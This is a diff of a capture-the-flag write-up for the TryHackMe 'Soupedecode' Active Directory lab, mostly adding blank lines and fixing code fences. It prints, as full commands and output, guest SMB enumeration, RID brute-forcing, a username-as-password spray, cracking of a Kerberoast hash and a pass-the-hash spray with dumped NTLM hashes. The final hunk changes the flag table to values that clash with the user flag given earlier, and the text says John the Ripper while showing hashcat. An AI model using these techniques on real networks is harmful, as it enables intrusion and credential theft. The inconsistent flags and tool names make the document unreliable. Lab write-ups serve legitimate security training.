@@ -91,15 +91,18 @@ No HTTP service was present, so the entire focus shifted to AD-focused enumerati
 A quick check confirmed the **Guest** account was live and accepted a blank password over SMB:
 
 ```
+
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ nxc smb $IP -u guest -p ''
 SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
-SMB         10.129.188.79   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
+SMB         10.129.188.79   445    DC01             [+] SOUPEDECODE.LOCAL\guest:
+
 ```
 
 **Response:**
 ```
 [+] SOUPEDECODE.LOCAL\guest:
+
 ```
 
 ### 2.2 Share Discovery
@@ -120,7 +123,8 @@ SMB         10.129.188.79   445    DC01             C$                          
 SMB         10.129.188.79   445    DC01             IPC$            READ            Remote IPC
 SMB         10.129.188.79   445    DC01             NETLOGON                        Logon server share 
 SMB         10.129.188.79   445    DC01             SYSVOL                          Logon server share 
-SMB         10.129.188.79   445    DC01             Users     
+SMB         10.129.188.79   445    DC01             Users
+
 ```
 
 **Visible Shares:**
@@ -142,6 +146,7 @@ Guest was only granted READ on `IPC$`, but that was enough to perform RID cyclin
 Using the Guest account, a RID brute-force pulled down every domain object:
 
 ```
+
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ nxc smb $IP -u guest -p '' --rid-brute 3000 | tee rid_brute.txt
 SMB                      10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
@@ -167,8 +172,10 @@ SMB                      10.129.188.79   445    DC01             522: SOUPEDECOD
 This surfaced **600+ user accounts** — including service accounts and machine accounts. The output was then filtered to a clean username list:
 
 ```
+
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ cat rid_brute.txt | awk '{print $6}' | cut -d '\' -f2 > valid_users.txt
+
 ```
 
 **Notable accounts found:**
@@ -190,6 +197,7 @@ This surfaced **600+ user accounts** — including service accounts and machine 
 With a solid user list in hand, the next move was spraying credentials. The classic "username equals password" misconfiguration was tested against every account using Kerbrute:
 
 ```
+
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ kerbrute passwordspray --domain SOUPEDECODE.LOCAL --dc $IP --user-as-pass valid_users.txt 
 
@@ -205,10 +213,12 @@ Version: v1.0.3 (9dad6e1) - 09/27/26 - Ronnie Flathers @ropnop
 2026/09/27 12:20:41 >  	10.129.188.79:88
 
 2026/09/27 12:20:41 >  [+] VALID LOGIN:	 ybob317@SOUPEDECODE.LOCAL:ybob317
+
 ```
 
 **Result:**
 ```
+
 2026/09/27 12:20:41 >  [+] VALID LOGIN:	 ybob317@SOUPEDECODE.LOCAL:ybob317
 
 ```
@@ -224,6 +234,7 @@ A working credential pair emerged: **`ybob317:ybob317`**
 Re-listed the shares using the new credential:
 
 ```
+
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ nxc smb $IP -u ybob317 -p 'ybob317' --shares
 SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
@@ -237,12 +248,14 @@ SMB         10.129.188.79   445    DC01             C$                          
 SMB         10.129.188.79   445    DC01             IPC$            READ            Remote IPC
 SMB         10.129.188.79   445    DC01             NETLOGON        READ            Logon server share 
 SMB         10.129.188.79   445    DC01             SYSVOL          READ            Logon server share 
-SMB         10.129.188.79   445    DC01             Users           READ ```
+SMB         10.129.188.79   445    DC01             Users           READ
+
 ```
 
 The **`Users`** share was now reachable. Connected and browsed:
 
 ```
+
 smbclient //$IP/Users -U ybob317
 
 ```
@@ -277,6 +290,7 @@ smb: \ybob317\Desktop\> ls
 		12942591 blocks of size 4096. 10789679 blocks available
 smb: \ybob317\Desktop\> get user.txt
 getting file \ybob317\Desktop\user.txt of size 33 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
 ```
 
 **User Flag:** `28189316c25dd3c0ad56d44d000d62a8`
@@ -310,62 +324,6 @@ The extracted hash was fed to John the Ripper:
 └──╼ $ hashcat roasted.txt /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting in autodetect mode
 
-OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-====================================================================================================================================================
-* Device #1: cpu-haswell-AMD Ryzen 5 PRO 5650U with Radeon Graphics, 6347/12758 MB (2048 MB allocatable), 12MCU
-
-Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
-The following mode was auto-detected as the only one matching your input hash:
-
-13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
-
-NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
-Do NOT report auto-detect issues unless you are certain of the hash type.
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-
-Hashes: 5 digests; 5 unique digests, 5 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Not-Iterated
-
-ATTENTION! Pure (unoptimized) backend kernels selected.
-Pure kernels can crack longer passwords, but drastically reduce performance.
-If you want to switch to optimized kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory required for this attack: 3 MB
-
-Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344385
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-
-Cracking performance lower than expected?                 
-
-* Append -O to the commandline.
-  This lowers the maximum supported password/salt length (usually down to 32).
-
-* Append -w 3 to the commandline.
-  This can cause your screen to lag.
-
-* Append -S to the commandline.
-  This has a drastic speed impact but can be better for specific attacks.
-  Typical scenarios are a small wordlist but a large ruleset.
-
-* Update your backend API runtime / driver the right way:
-  https://hashcat.net/faq/wrongdriver
-
-* Create more work items to make use of your parallelization power:
-  https://hashcat.net/faq/morework
-
 $krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$44246eb2bf1573507f9e98a68d60dd8b$5ffe87889b3aefe74f1699909555eed943ef1aae4ed226a077c4b630b5101aa574be9a43a4e671aa3d7bd2afebce0d0e8c03e1be2ea5c6d6dfb4764264e156d9d6d7b9ba3c15d0a606476211d818bbba75c91123498687300f5158f72dfc14294df15359f06e6a5cc277a0f2a95e92b1364256576010f04409012efc51c861648ee1dac49e2619f2586e48cadf2bdab6ea4d82f8c425e2b13eace377fba359ee6869766564ed70b46854d976eeda49267ffccff3b57ce66e598661c604d96389b815e06753273324421f3a327f98ac72aa43f2746f59ef6f129c580173be6d89e341e243209560c4678361aeeb2ea07f6c7ccc8be99bb79d11301cdf620c93ada1b28ed4957fbcf741647bd96081c1d4de9368b96462fe1513f3fee7ed2f8366136d82a7534c6e5ebd5afd52d9b978720b3fe601394ffcd03e30e8f489cea4269293ef2cf4fc21ebf1e9448f99810519931b8fc81753995a6e0b2651e045a519898ae3582a32db36357a59f0221c55e8c5e16b6296c60e740b2a4f5135bed0023342f4991eceb81159413bfd1f9869734ae0f370b71aabaaa45395c7fddf167a95bcf1be340abea80ec1d25898765165e8264443e215c39083e1ec61c51fedc1ebbe5b46cc86b7fb691c50a41624d516413e667a3a7a92917fba5a9a25146f3ebd50a7b0af38f91ce2e9e7b497c4f50fe041bea7215e4c06d63c57c5540f8952680bd12a68b37aa31aded7888376b84d1e0bb5e3f8ee8bec7bf25604129f4084f005606141bf3efb4232c04594a75ac9257dcd934a64eaa6786c209231f3d615e5b8101cbdf27ae97733938ae4af3dc35ec2e68fffacc1ea91493b5be79ffb405d939e8fb549868ff4f7e832419d46cf058abee962ab9b6ec30d054a582b46252d732c8e0d7441498b35d15ee44bd07630fe8b272f0dffd26c7639daaeea02719f2e03e2e079822d7cbd72f794940df9c50b6c0a57efb0109bf8cf539d977c0928b447b311d980893afbfe6d16e5032147c67bc04ce32e57132cf804161ff5244be59481bd7a2a324529628ab936438d023d3dafc0a6b19dd062d4a3cac8a7da81ffc43723c1eff260962e27b080c10b489a4983bad205835b8916dfca620413a84bbecdf37ae13ec2311a017def1e08c52b072a10b4b7f6c47c8ddb7c8f995f1668928f2fdc6ba55bcbbdcbc0e57a2611ee4ccfec0004fdbb993e031b6932daef396e539ac4ccb08bda2e4b538a2934c454b3c37fa2726ffab517da52a8f213483fcb66ef79d749057be99c6711c95079a6af203b0abf32d13cec64afba826a8ac65f83e15c4210e6ffee5b0f44c5ef1ecae610856bed1e0e41d0a05c8e8b62f71a132405b55ee06988ae1a849b4cf288f06f035a05e3454d3eeaf934e6845303effc05be16b4a07f463c727e882529848a460a42c53dfae70b6ce1d7ea5c33c6ef82e234f4a346b35c5434eb291b97c04ad7bb34d0b72d25042c3a66fc41ed1d:Password123!!
 ```
 
@@ -385,6 +343,7 @@ file_svc : Password123!!
 With the `file_svc` credentials, the previously hidden **`backup`** share became reachable:
 
 ```
+
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ smbclient //$IP/backup -U file_svc 
 Password for [WORKGROUP\file_svc]:
@@ -397,12 +356,13 @@ smb: \> dir
 		12942591 blocks of size 4096. 10800021 blocks available
 smb: \> get backup_extract.txt
 getting file \backup_extract.txt of size 892 as backup_extract.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
-smb: \> 
+
 ```
 
 A file named **`backup_extract.txt`** was sitting inside. Reading it revealed a full set of NTLM hashes for domain accounts:
 
 ```
+
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ cat backup_extract.txt 
 WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
@@ -419,12 +379,15 @@ MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d784927399
 ```
 
 **Extracted hashes (sample):**
+
 ```
+
 WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
 DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
 CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
 FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
-...
+
+
 ```
 
 ### 5.2 Preparing Hashes for Pass-the-Hash
@@ -434,11 +397,13 @@ Split the loot into usernames and hashes for spraying:
 ```
 cat backup_extract.txt | cut -d ':' -f 1 > extracted_users.txt
 cut -d: -f4 backup_extract.txt > ntlm-hashes.txt
+
 ```
 
 Machine accounts, `admin`, and `Administrator` were added to the list, then a Pass-the-Hash spray was launched:
 
 ```
+
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ nxc smb $IP -u extracted_users.txt -H ntlm-hashes.txt -d SOUPEDECODE.LOCAL --no-bruteforce --continue-on-success
 SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
@@ -451,12 +416,14 @@ SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\Backup
 SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\ApplicationServer$:8cd90ac6cba6dde9d8038b068c17e9f5 STATUS_LOGON_FAILURE 
 SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\PrintServer$:b8a38c432ac59ed00b2a373f4f050d28 STATUS_LOGON_FAILURE 
 SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\ProxyServer$:4e3f0bb3e5b6e3e662611b1a87988881 STATUS_LOGON_FAILURE 
-SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\MonitoringServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE```
+SMB         10.129.188.79   445    DC01             [-] SOUPEDECODE.LOCAL\MonitoringServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
+
 ```
 
 **Valid Hash Found:**
 
 ```
+
 SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559
 
 ```
@@ -571,8 +538,8 @@ soupedecode\administrator
 
 | Flag | Value |
 |------|-------|
-| **User Flag** | `28189316c25dd3c0ad56d44d000d62a8` |
-| **Root Flag** | `27cb2be302c388d63d27c86bfdd5f56a` |
+| **User Flag** | `28189316c25dd3c0ad6d44d000d62a8` |
+| **Root Flag** | `27cb2be302c388d63d7c86bfdd5f56a` |
 
 ---
 
